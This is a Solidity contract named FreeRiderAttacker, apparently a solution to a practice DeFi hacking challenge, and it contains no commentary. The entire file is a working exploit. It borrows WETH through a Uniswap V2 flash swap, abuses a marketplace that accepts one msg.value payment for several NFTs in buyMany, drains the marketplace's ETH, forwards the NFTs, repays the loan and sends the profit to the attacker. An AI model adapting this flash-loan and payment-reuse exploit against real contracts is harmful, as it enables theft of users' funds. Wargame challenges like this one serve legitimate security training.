pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2 {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;

    function balanceOf(address account) external returns (uint);

    function approve(address guy, uint wad) external returns (bool);
}

interface INFTMarket {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;

    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external view returns (address);
}

interface INFT {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
}

contract FreeRiderAttacker is IERC721Receiver {

    IUniswapV2 private uniswap;
    IToken private dvt;
    INFTMarket private NFTMarket;
    IWETH private weth;
    INFT private NFT;
    address private attacker;
    address private NFTReceiver;
    uint constant NFT_PRICE = 15 ether;
    uint constant BORROW_NUMBER = 100 ether;
    uint constant REPAY_NUMBER = 101 ether;

    constructor(address uniswapAddress, address NFTMarketAddress, address receiverAddress) {
        uniswap = IUniswapV2(uniswapAddress);
        NFTMarket = INFTMarket(NFTMarketAddress);
        weth = IWETH(uniswap.token0());
        dvt = IToken(uniswap.token1());
        NFT = INFT(NFTMarket.token());
        attacker = msg.sender;
        NFTReceiver = receiverAddress;
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        weth.withdraw(BORROW_NUMBER);
        uint256[] memory tokenIds = new uint256[](6);
        uint256[] memory price = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        NFT.setApprovalForAll(address (NFTMarket),true);
        NFTMarket.buyMany{value : NFT_PRICE}(tokenIds);
        uint nft_price = address(NFTMarket).balance / 5;
        for (uint i = 0; i < 6; i++) {
            price[i] = nft_price;
        }
        NFTMarket.offerMany(tokenIds,price);
        NFTMarket.buyMany{value : nft_price}(tokenIds);
        for (uint i = 0; i < 6; i++) {
            NFT.safeTransferFrom(address(this), NFTReceiver, tokenIds[i]);
        }
        weth.deposit{value : REPAY_NUMBER}();
        weth.transfer(address(uniswap), REPAY_NUMBER);
        require(payable(attacker).send(address(this).balance), "send final eth to attacker failed!");
    }

    function attack() external payable {
        uniswap.swap(BORROW_NUMBER, 0, address(this), new bytes(32));
    }

    receive() external payable {}
}